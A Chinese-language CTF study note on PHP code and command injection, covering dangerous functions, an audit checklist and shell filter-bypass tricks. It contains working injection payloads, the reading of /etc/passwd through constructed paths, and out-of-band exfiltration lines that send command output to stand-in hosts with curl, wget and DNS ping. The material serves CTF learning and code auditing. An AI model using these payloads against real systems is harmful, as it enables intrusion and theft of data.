# PHP命令执行与过滤绕过

>[PHP 官方手册](https://www.php.net/manual/zh/)
>
>[程序执行函数](https://www.php.net/manual/zh/ref.exec.php)
>
>访问 [Rot13 / Atbash / Base64 编码解码](https://xobear.cn/CTF/Web/PHP/rot13base.html)

这篇主要记录 CTF Web 中的 PHP 命令执行、代码执行和 Shell 过滤绕过。先区分两个概念：

- **PHP 代码执行**：执行的是 PHP 代码，例如 `eval($_GET["a"])`。
- **系统命令执行**：执行的是操作系统命令，例如 `system($_GET["cmd"])`。

做题时先判断自己处在哪一层：PHP 语法层、Shell 命令层，还是文件包含/伪协议层。

## 常见危险函数

### 输出与调试

```php
var_dump($var);       // 输出类型和值
print_r($var);        // 打印数组/对象结构
echo $var;            // 直接输出
var_export($var);     // 输出接近 PHP 代码的结构
printf("%s", $var);   // 格式化输出
phpinfo();            // 查看 PHP 配置、版本、禁用函数、路径
```

### 文件读取与包含

```php
include $_GET["file"];        // 文件包含
require $_GET["file"];
include_once $_GET["file"];
require_once $_GET["file"];

file_get_contents($f);        // 读取文件内容
file_put_contents($f, $data); // 写文件
readfile($f);                 // 读取并直接输出
fopen($f, "r");               // 打开文件
fread($fp, 1024);             // 读取文件指针
highlight_file($f);           // 高亮源码
show_source($f);              // highlight_file 的别名
scandir(".");                 // 列目录
```

伪协议细节看：[PHP伪协议](./PHP伪协议.md)

### PHP 代码执行

```php
eval($_GET["code"]);
assert($_GET["code"]);
preg_replace("/.*/e", $_GET["code"], "");
create_function("", $_GET["code"]);
```

版本注意：

- `eval()` 一直危险。
- `assert("php code")` 在 PHP 7.2 起弃用，PHP 8.0 起不再执行字符串代码。
- `preg_replace /e` 在 PHP 5.5 弃用，PHP 7.0 移除。
- `create_function()` 在 PHP 7.2 弃用，PHP 8.0 移除。

### 系统命令执行

| 函数/写法 | 输出行为 | 返回值特点 |
| --- | --- | --- |
| `system($cmd)` | 直接输出命令结果 | 返回最后一行输出 |
| `exec($cmd)` | 默认不直接输出 | 返回最后一行，可用第二个参数接收全部输出 |
| `shell_exec($cmd)` | 不直接输出 | 返回完整输出字符串 |
| `passthru($cmd)` | 直接输出原始结果 | 适合二进制输出 |
| `popen($cmd, "r")` | 返回进程管道 | 可用 `fread()` 读取 |
| `proc_open()` | 可控 stdin/stdout/stderr | 更灵活 |
| <code>`id`</code> | 不直接输出 | 反引号，类似 `shell_exec("id")` |

示例：

```php
<?php
system("id");
echo shell_exec("whoami");
echo `pwd`;
```

如果 `disable_functions` 禁用了 `shell_exec`，反引号通常也不可用。

## 命令执行审计路线

看到用户输入进入这些函数时就要敏感：

```php
system($_GET["cmd"]);
exec($_POST["cmd"]);
shell_exec($a);
passthru($c);
eval($_GET["code"]);
include($_GET["file"]);
```

按这个顺序看：

1. 输入来自哪里：`$_GET`、`$_POST`、`$_COOKIE`、`$_REQUEST`、请求头、上传文件。
2. 进入的是 PHP 代码执行、系统命令执行，还是文件包含。
3. 有没有过滤：正则、黑名单、长度、大小写、空格、特殊符号。
4. 有没有回显：有回显直接读；无回显考虑写文件、DNS/HTTP 外带、时间盲注。
5. 看环境：Linux/Windows、当前目录、权限、`disable_functions`、`open_basedir`。
6. 看 Shell：通常是 `/bin/sh -c`，不是所有 Bash 特性都一定可用。

## 常用信息收集命令

```sh
id
whoami
pwd
ls
ls -la
find / -name flag* 2>/dev/null
cat flag.php
tac flag.php
nl flag.php
head flag.php
tail flag.php
base64 flag.php
```

常用 PHP 环境检查：

```php
phpinfo();
echo phpversion();
echo getcwd();
print_r(scandir("."));
echo ini_get("disable_functions");
echo ini_get("open_basedir");
```

## Shell 分隔符与重定向

| 符号 | 含义 | 示例 |
| --- | --- | --- |
| `;` | 顺序执行 | `id;whoami` |
| `&&` | 前一条成功才执行后一条 | `ls /flag && cat /flag` |
| `||` | 前一条失败才执行后一条 | `cat /no || cat /flag` |
| <code>&#124;</code> | 管道，前者输出给后者 | <code>cat flag.php &#124; base64</code> |
| `&` | 后台执行 | `sleep 5 &` |
| `#` | 注释后续内容 | `id #` |
| `%0a` | 换行，也可分隔命令 | `id%0awhoami` |
| <code>`cmd`</code> | 命令替换 | <code>echo `whoami`</code> |
| `$(cmd)` | 命令替换，较新写法 | `echo $(whoami)` |

重定向：

| 写法 | 含义 |
| --- | --- |
| `>` | 覆盖写入文件 |
| `>>` | 追加写入文件 |
| `<` | 从文件读入标准输入 |
| `2>` | 重定向错误输出 |
| `2>&1` | 把错误输出合并到标准输出 |
| `>/dev/null 2>&1` | 丢弃正常输出和错误输出 |

无回显题常见代码：

```php
system($c . " >/dev/null 2>&1");
```

可以尝试用分隔符截断后面的重定向：

```text
?c=id;
?c=id%0a
?c=id%23
?c=id||whoami
```

是否成功取决于题目的拼接方式和过滤规则。

## URL 编码速查

| 字符 | URL 编码 |
| --- | --- |
| 空格 | `%20` 或 `+` |
| 换行 | `%0A` |
| 回车 | `%0D` |
| Tab | `%09` |
| `;` | `%3B` |
| `&` | `%26` |
| <code>&#124;</code> | `%7C` |
| `#` | `%23` |
| `?` | `%3F` |
| `/` | `%2F` |
| `\` | `%5C` |
| `=` | `%3D` |

## 空格被过滤

常见替代：

```sh
cat${IFS}flag.php
cat$IFS$9flag.php
cat<flag.php
tac<flag.php
{cat,flag.php}
```

说明：

- `${IFS}` 是 Shell 的内部字段分隔符，默认包含空格、Tab、换行。
- `<` 可以把文件作为命令标准输入，例如 `tac<flag.php`。
- `{cat,flag.php}` 是 Bash 的 brace expansion，会展开成 `cat flag.php`。
- 目标环境如果是 `/bin/sh`，brace expansion 不一定可用。

Tab 也可以当分隔符：

```text
cat%09flag.php
```

换行也可分隔命令：

```text
id%0awhoami
```

## 关键字被过滤

### 过滤 `cat`

替代读文件：

```sh
tac flag.php
nl flag.php
more flag.php
less flag.php
head flag.php
tail flag.php
od -c flag.php
xxd flag.php
base64 flag.php
strings flag.php
sed -n '1,120p' flag.php
awk 1 flag.php
```

有些 PHP 源码在浏览器页面不显示，需要查看源码或 Base64：

```sh
base64 flag.php
```

### 过滤连续字符串

Shell 会把相邻字符串拼接：

```sh
c'a't flag.php
ca\t flag.php
ca""t flag.php
```

变量拼接：

```sh
a=ca;b=t;$a$b flag.php
```

通配符：

```sh
/???/??t flag.php
ca? flag.php
```

通配符由 Shell 展开，不是 `cat`、`nl` 等命令自己支持。

### 过滤 `/`

可以从环境变量中截取 `/`：

```sh
echo ${PATH:0:1}
echo ${PWD:0:1}
```

构造路径：

```sh
cat ${PATH:0:1}etc${PATH:0:1}passwd
```

也可以尝试相对路径：

```sh
cat flag.php
cat ./flag.php
cat ../flag.php
```

## 小写字母被过滤

如果能用 Bash，可以从环境变量里截取字符：

```sh
echo ${PATH:0:1}
echo ${PWD:1:1}
echo ${USER:0:1}
```

变量截取格式：

```sh
${VAR:offset:length}
```

示例：

```sh
VAR=abc
echo ${VAR:0:1}  # a
echo ${VAR:1:1}  # b
echo ${VAR:2:1}  # c
```

变量长度可构造数字：

```sh
echo ${#VAR}
echo ${#}
echo ${##}
```

常见环境变量：

| 变量 | 说明 |
| --- | --- |
| `$PWD` | 当前目录 |
| `$PATH` | 可执行文件搜索路径 |
| `$HOME` | 用户家目录 |
| `$USER` | 当前用户名 |
| `$SHELL` | Shell 路径 |
| `$IFS` | 内部字段分隔符 |
| `$RANDOM` | Bash 随机数 |
| `$UID` | 用户 ID，Bash 常见 |
| `$SHLVL` | Shell 层级 |
| `$0` | 当前 Shell 或脚本名 |

注意：

- `${VAR:0:1}` 是 Bash 常见写法，`/bin/sh` 不一定支持。
- 过滤非常严格时，通常要结合题目环境慢慢构造，不要直接套固定 payload。

## 数字被过滤

Bash 算术扩展可以产生数字：

```sh
echo $(())
echo $((~$(())))
```

常见结果：

```text
$(())          -> 0
$((~$(())))   -> -1
${##}         -> 1
$((${##}+${##})) -> 2
```

这些技巧依赖 Shell 特性，环境不同结果可能不同。

## 无回显命令执行

没有页面回显时，先确认命令是否执行：

```sh
sleep 5
ping -c 1 your.dnslog.domain
```

常见外带：

```sh
curl http://your-server/$(whoami)
wget http://your-server/$(id)
ping -c 1 $(whoami).your.dnslog.domain
```

写 Web 目录：

```sh
echo test > a.txt
cat flag.php > a.txt
```

如果当前目录不可写，先看：

```sh
pwd
ls -la
find /tmp -maxdepth 1 -type d -writable 2>/dev/null
```

错误输出也可能包含关键信息：

```sh
id 2>&1
cat /notfound 2>&1
```

## Windows 命令执行

有些题运行在 Windows，常见命令不同：

```bat
whoami
dir
type flag.txt
cd
echo test
```

分隔符：

```bat
command1 & command2
command1 && command2
command1 || command2
```

路径：

```text
C:\Windows\win.ini
.\flag.txt
..\flag.txt
```

## `preg_match()` 过滤

常见白名单写法：

```php
<?php
if (!preg_match('/^[a-zA-Z0-9]+$/', $input)) {
    die("非法字符");
}
```

审计点：

- 是否用了黑名单。
- 是否用了 `i` 忽略大小写。
- 是否用了 `m` 多行模式，影响 `^` 和 `$`。
- 是否用了 `s`，让 `.` 匹配换行。
- 是否把数组传给 `preg_match()`。
- 是否正确判断返回值。

错误判断示例：

```php
if (strpos($cmd, "cat")) {
    die("no cat");
}
```

如果 `cat` 出现在开头，`strpos()` 返回 `0`，条件为 false。正确写法：

```php
if (strpos($cmd, "cat") !== false) {
    die("no cat");
}
```

## `include` / `require`

区别：

| 函数 | 文件不存在时 |
| --- | --- |
| `include` | Warning，脚本继续 |
| `require` | Fatal Error，脚本终止 |
| `include_once` | 只包含一次 |
| `require_once` | 只包含一次，失败终止 |

文件包含常和伪协议配合：

```text
?file=php://filter/read=convert.base64-encode/resource=index.php
?file=php://input
?file=data://text/plain,<?php system("id"); ?>
```

具体看：[PHP伪协议](./PHP伪协议.md)

## `system()` 示例

基础格式：

```php
<?php
system("id");
```

危险写法：

```php
<?php
$cmd = $_GET["cmd"];
system($cmd);
```

Payload：

```text
?cmd=id
?cmd=whoami
?cmd=cat%20flag.php
?cmd=cat${IFS}flag.php
?cmd=tac<flag.php
```

## `file_get_contents()` 示例

读取文件：

```php
<?php
echo file_get_contents($_GET["file"]);
```

Payload：

```text
?file=flag.php
?file=php://filter/read=convert.base64-encode/resource=flag.php
?file=/etc/passwd
```

如果 `allow_url_fopen=On`，还可能读取 URL：

```text
?file=http://example.com/a.txt
```

但远程读取和远程包含是两回事；远程包含还需要 `allow_url_include=On`。

## 禁用函数

先看：

```php
phpinfo();
echo ini_get("disable_functions");
```

常见被禁函数：

```text
system, exec, shell_exec, passthru, popen, proc_open, pcntl_exec
```

如果命令执行函数都被禁：

- 看是否还有 PHP 代码执行：`eval`、可变函数、回调函数。
- 看是否能文件读取：`file_get_contents`、`readfile`、`highlight_file`。
- 看是否能文件写入：`file_put_contents`、上传。
- 看是否能文件包含 + 伪协议。
- 看是否能 SQL 注入、SSRF、反序列化绕到别的利用链。

不要把 `assert()` 当成稳定的命令执行绕过；PHP 8 已不再执行字符串断言代码。

## 防护函数与绕过观察

开发中常见防护：

```php
escapeshellarg($arg);
escapeshellcmd($cmd);
```

作用：

- `escapeshellarg()` 把一个参数安全地作为单个 Shell 参数。
- `escapeshellcmd()` 转义命令字符串中的特殊字符。

CTF 审计时注意：

- 是整个命令可控，还是只有某个参数可控。
- 是否先拼接再转义。
- 是否存在编码、换行、数组、宽字节等输入处理差异。
- Windows 和 Linux 的转义规则不同。

## 快速 payload 表

| 场景 | Payload |
| --- | --- |
| 看身份 | `id` |
| 看用户 | `whoami` |
| 当前目录 | `pwd` |
| 列目录 | `ls -la` |
| 读文件 | `cat flag.php` |
| `cat` 被过滤 | `tac flag.php`、`nl flag.php`、`base64 flag.php` |
| 空格被过滤 | `cat${IFS}flag.php`、`cat<flag.php`、`{cat,flag.php}` |
| 无回显检测 | `sleep 5` |
| 错误回显 | `id 2>&1` |
| 写文件 | `echo test>a.txt` |
| 源码读取 | `php://filter/read=convert.base64-encode/resource=index.php` |

## 做题检查清单

1. 找危险函数：`system`、`exec`、`shell_exec`、`passthru`、反引号、`eval`、`include`。
2. 看用户输入能否到危险函数。
3. 判断是 PHP 代码层还是 Shell 命令层。
4. 先用 `id`、`whoami`、`pwd`、`ls` 测试。
5. 看是否有回显；没有就用时间、写文件、DNS/HTTP 外带。
6. 看过滤了什么：空格、斜杠、字母、数字、分隔符、关键字。
7. 根据过滤选择 `${IFS}`、重定向、通配符、拼接、编码、替代命令。
8. 看 `disable_functions`、`open_basedir`、`allow_url_include`。
9. 如果命令执行走不通，转向文件读取、文件包含、上传、反序列化、SQL 注入。
